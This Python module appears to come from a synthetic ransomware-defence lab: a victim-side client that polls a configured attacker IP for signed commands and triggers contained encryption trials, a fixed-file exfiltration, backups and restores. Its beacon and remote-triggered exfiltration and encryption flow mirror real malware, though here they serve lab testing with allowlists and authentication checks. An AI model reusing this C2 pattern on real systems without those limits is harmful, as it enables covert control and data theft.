"""Victim-side signed C2 client for the synthetic lab.

Run on victim after Kali server is listening: python3 -m victim.c2_client
With --enable-synthetic-actions, signed allowlisted commands can run the
copy-only containment trial, fixed synthetic transfer, dataset verification,
TLS backup, or isolated restore. PING and STOP remain dry-run.
Use --loop --enable-synthetic-actions to arm repeated dashboard actions.
"""

import argparse
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path

from config import ATTACKER_IP, AUTH_MODE, BACKUP_DIR, C2_PORT, PROJECT_ROOT
from shared.c2_protocol import COMMANDS, log_event, pack, unpack


def receive_once(*, enable_synthetic_actions=False):
    with socket.create_connection((ATTACKER_IP, C2_PORT), timeout=10) as connection:
        connection.settimeout(180)
        try:
            message = unpack(connection, auth_mode=AUTH_MODE)
            command = message["cmd"]
            if command == "REJECT":
                log_event("untrusted_command_blocked", role="victim",
                          reason=message["data"].get("reason"))
                print(f"No command relayed: {message['data'].get('reason')}")
                return
            if command not in COMMANDS:
                raise ValueError("Expected a command")
        except (ValueError, UnicodeError) as exc:
            log_event("command_rejected", role="victim", reason=str(exc))
            connection.sendall(pack("REJECT", signed=AUTH_MODE, data={"reason": str(exc)}))
            print(f"REJECT: {exc}")
            return
        log_event("command_accepted", role="victim", cmd=command,
                  authenticated=message["authenticated"])
        if command == "START_ENCRYPT" and enable_synthetic_actions:
            if not AUTH_MODE or not message["authenticated"]:
                reason = "Synthetic actions require authenticated C2"
                log_event("command_rejected", role="victim", cmd=command, reason=reason)
                connection.sendall(pack("REJECT", signed=AUTH_MODE, data={"reason": reason}))
                print(f"REJECT: {reason}")
                return
            try:
                # This existing test runs only on disposable copies, registers
                # its own child, and verifies zero real copies before success.
                completed = subprocess.run(
                    [sys.executable, "-m", "tests.full_defense_trial"],
                    cwd=Path(PROJECT_ROOT), capture_output=True, text=True,
                    timeout=30, check=True)
                trial_lines = [line.split("Trial evidence: ", 1)[1]
                               for line in completed.stdout.splitlines()
                               if line.startswith("Trial evidence: ")]
                if len(trial_lines) != 1 or "zero real encrypted copies" not in completed.stdout:
                    raise RuntimeError("Trial did not confirm containment")
                trial = Path(trial_lines[0]).name
                log_event("synthetic_action_completed", role="victim", cmd=command,
                          trial=trial, contained=True)
                response = {"cmd": command, "executed": True,
                            "contained": True, "trial": trial}
                connection.sendall(pack("ACK", signed=True, data=response))
                print(f"ACK: controlled encryption trial {trial} contained")
            except (subprocess.CalledProcessError, subprocess.TimeoutExpired,
                    RuntimeError, OSError) as exc:
                reason = f"Controlled trial failed: {str(exc)[:160]}"
                log_event("synthetic_action_failed", role="victim", cmd=command,
                          reason=reason)
                connection.sendall(pack("REJECT", signed=True, data={"reason": reason}))
                print(f"REJECT: {reason}")
            return
        if command == "START_EXFIL" and enable_synthetic_actions:
            if not AUTH_MODE or not message["authenticated"]:
                reason = "Synthetic actions require authenticated C2"
                log_event("command_rejected", role="victim", cmd=command, reason=reason)
                connection.sendall(pack("REJECT", signed=AUTH_MODE, data={"reason": reason}))
                print(f"REJECT: {reason}")
                return
            sample = "01_Operations/report.pdf"
            try:
                from victim.transfer_sender import send_file
                send_file(sample)  # send_file enforces its own fixed synthetic allowlist.
                log_event("synthetic_action_completed", role="victim", cmd=command,
                          file=sample)
                connection.sendall(pack("ACK", signed=True,
                                        data={"cmd": command, "executed": True,
                                              "file": sample}))
                print(f"ACK: controlled encrypted transfer completed for {sample}")
            except (OSError, ValueError, RuntimeError) as exc:
                reason = f"Controlled transfer failed: {str(exc)[:160]}"
                log_event("synthetic_action_failed", role="victim", cmd=command,
                          reason=reason)
                connection.sendall(pack("REJECT", signed=True,
                                        data={"reason": reason}))
                print(f"REJECT: {reason}")
            return
        if command in {"VERIFY_DATASET", "RUN_BACKUP", "RESTORE_TRIAL"} and enable_synthetic_actions:
            if not AUTH_MODE or not message["authenticated"]:
                reason = "Synthetic actions require authenticated C2"
                log_event("command_rejected", role="victim", cmd=command, reason=reason)
                connection.sendall(pack("REJECT", signed=AUTH_MODE, data={"reason": reason}))
                print(f"REJECT: {reason}")
                return
            server = None
            try:
                if command == "VERIFY_DATASET":
                    checked = subprocess.run(
                        [sys.executable, "-m", "victim.full_dataset", "--verify"],
                        cwd=Path(PROJECT_ROOT), capture_output=True, text=True,
                        timeout=30, check=True)
                    if "PASS: 20 generated files match" not in checked.stdout:
                        raise RuntimeError("Dataset verifier did not confirm all 20 files")
                    result = {"cmd": command, "executed": True, "intact": True, "files": 20}
                elif command == "RUN_BACKUP":
                    from victim.backup_service import backup, serve_once, snapshot_files
                    ready = threading.Event()
                    outcome = {}

                    def server_job():
                        try:
                            outcome["path"] = serve_once(ready=ready, accept_timeout=25)
                        except Exception as exc:
                            outcome["error"] = str(exc)[:160]
                            ready.set()

                    server = threading.Thread(target=server_job, daemon=True)
                    server.start()
                    if not ready.wait(timeout=5) or "error" in outcome:
                        raise RuntimeError(outcome.get("error", "Backup TLS server did not start"))
                    response = backup()
                    server.join(timeout=35)
                    if server.is_alive() or "error" in outcome:
                        raise RuntimeError(outcome.get("error", "Backup TLS server did not finish"))
                    snapshot_name = response["snapshot"]
                    snapshot_files(Path(BACKUP_DIR) / snapshot_name)
                    result = {"cmd": command, "executed": True,
                              "snapshot": snapshot_name, "files": 20, "verified": True}
                else:
                    from victim.backup_service import restore_to_trial, snapshot_files
                    root = Path(BACKUP_DIR)
                    snapshots = [p for p in root.glob("snapshot-*")
                                 if p.is_dir() and not p.is_symlink()]
                    if not snapshots:
                        raise FileNotFoundError("No backup snapshot exists")
                    latest = max(snapshots, key=lambda p: p.stat().st_mtime_ns)
                    snapshot_files(latest)
                    trial = restore_to_trial(latest)
                    result = {"cmd": command, "executed": True,
                              "snapshot": latest.name, "trial": trial.name, "files": 20}
                log_event("synthetic_action_completed", role="victim", **result)
                connection.sendall(pack("ACK", signed=True, data=result))
                print(f"ACK: {command} completed: {result}")
            except (OSError, ValueError, RuntimeError, subprocess.CalledProcessError,
                    subprocess.TimeoutExpired) as exc:
                if server is not None and server.is_alive():
                    server.join(timeout=26)
                reason = f"Controlled {command} failed: {str(exc)[:160]}"
                log_event("synthetic_action_failed", role="victim", cmd=command, reason=reason)
                connection.sendall(pack("REJECT", signed=True, data={"reason": reason}))
                print(f"REJECT: {reason}")
            return
        connection.sendall(pack("ACK", signed=AUTH_MODE, data={"cmd": command, "executed": False}))
        print(f"ACK: {command} accepted (dry run; no action executed)")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--enable-synthetic-actions", action="store_true",
                        help="Allow signed, fixed synthetic attack and defense actions")
    parser.add_argument("--loop", action="store_true",
                        help="Poll for successive allowlisted commands until Ctrl+C")
    parser.add_argument("--interval", type=float, default=1.0,
                        help="Seconds between connection attempts in loop mode (0.5 to 5)")
    args = parser.parse_args()
    if not 0.5 <= args.interval <= 5:
        parser.error("--interval must be between 0.5 and 5 seconds")
    if args.loop:
        print("Synthetic C2 agent polling for signed lab commands; Ctrl+C to stop", flush=True)
        while True:
            try:
                receive_once(enable_synthetic_actions=args.enable_synthetic_actions)
            except (ConnectionRefusedError, TimeoutError, OSError):
                pass  # A dashboard action has not opened the one-command listener yet.
            time.sleep(args.interval)
    else:
        receive_once(enable_synthetic_actions=args.enable_synthetic_actions)